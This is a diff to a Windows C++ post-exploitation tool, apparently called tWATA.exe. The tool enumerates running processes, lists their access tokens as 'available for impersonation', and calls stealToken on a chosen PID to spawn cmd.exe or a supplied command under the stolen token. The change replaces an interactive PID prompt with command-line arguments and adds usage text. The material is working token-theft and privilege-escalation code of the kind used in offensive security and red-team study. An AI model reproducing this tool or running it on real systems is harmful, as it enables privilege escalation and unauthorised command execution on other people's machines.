@@ -15,7 +15,12 @@ struct TOKEN_INFORMATION
 	TELEV tokenElevationType;
 };
 
-int main(int argc, char* argv[])
+void usage()
+{
+	printf("Usage: .\\tWATA.exe <pid> [<cmd>]");
+}
+
+int wmain(int argc, wchar_t* argv[])
 {
 	HANDLE hProcessSnap;
 	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -36,8 +41,8 @@ int main(int argc, char* argv[])
 		exit(1);
 	}
 
-	std::unordered_map<std::wstring, std::list<TOKEN_INFORMATION>> username_tokeninfo {};
-	std::unordered_map<int, HANDLE> pid_token {};
+	std::unordered_map<std::wstring, std::list<TOKEN_INFORMATION>> username_tokeninfo{};
+	std::unordered_map<int, HANDLE> pid_token{};
 
 	HANDLE hProcess;
 	HANDLE hToken;
@@ -75,27 +80,64 @@ int main(int argc, char* argv[])
 	} while (Process32Next(hProcessSnap, &pe32));
 	CloseHandle(hProcessSnap);
 
-	int i = 0;
-	wprintf(L"Available tokens for impersonation: \n");
-	for (const auto& kv : username_tokeninfo)
+	if (argc == 1)
 	{
-		i++;
-		wprintf(L"[%d] %s\n", i, kv.first.c_str());
-		std::list<TOKEN_INFORMATION> tokens = kv.second;
-		for (TOKEN_INFORMATION token : tokens)
+		int i = 0;
+		wprintf(L"Available tokens for impersonation: \n");
+		for (const auto& kv : username_tokeninfo)
 		{
-			wprintf(L"\t[%d] TokenType: %s\tImpersonationLevel: %s\tisElevated: %s\tElevationType: %s\tIntegrityLevel: %s\n", 
-				token.pid, token.tokenStatistics.tokenType, token.tokenStatistics.impersonationLevel, token.tokenElevationType.isElevated, token.tokenElevationType.elevationType, token.tokenIntegrityLevel.integrityLevel);
+			i++;
+			wprintf(L"[%d] %s\n", i, kv.first.c_str());
+			std::list<TOKEN_INFORMATION> tokens = kv.second;
+			for (TOKEN_INFORMATION token : tokens)
+			{
+				wprintf(L"\t[%d] TokenType: %s\tImpersonationLevel: %s\tisElevated: %s\tElevationType: %s\tIntegrityLevel: %s\n",
+					token.pid, token.tokenStatistics.tokenType, token.tokenStatistics.impersonationLevel, token.tokenElevationType.isElevated, token.tokenElevationType.elevationType, token.tokenIntegrityLevel.integrityLevel);
+			}
 		}
+		usage();
+	}
+	else if (argc == 2)
+	{
+		int pid;
+		wchar_t cmd[] = L"C:\\Windows\\System32\\cmd.exe\0";
+
+		try
+		{
+			pid = std::stoi(argv[1]);
+		}
+		catch (const std::invalid_argument& e)
+		{
+			std::cout << "Invalid argument provided -> PID should be integer" << std::endl;
+			usage();
+			std::exit(1);
+		}
+		hToken = pid_token[pid];
+		stealToken(hToken, cmd);
+
+	}
+	else if (argc == 3)
+	{
+		int pid;
+		wchar_t* cmd = argv[2];
+
+		try
+		{
+			pid = std::stoi(argv[1]);
+		}
+		catch (const std::invalid_argument& e)
+		{
+			std::cout << "Invalid argument provided -> PID should be integer" << std::endl;
+			usage();
+			std::exit(1);
+		}
+		hToken = pid_token[pid];
+		stealToken(hToken, cmd);
+	}
+	else
+	{
+		usage();
 	}
 
-	int pid;
-	
-	printf("Enter PID to impersonate token from: ");
-	std::cin >> pid;
-	hToken = pid_token[pid];
-
-	stealToken(hToken);
-	
 	return 0;
 }
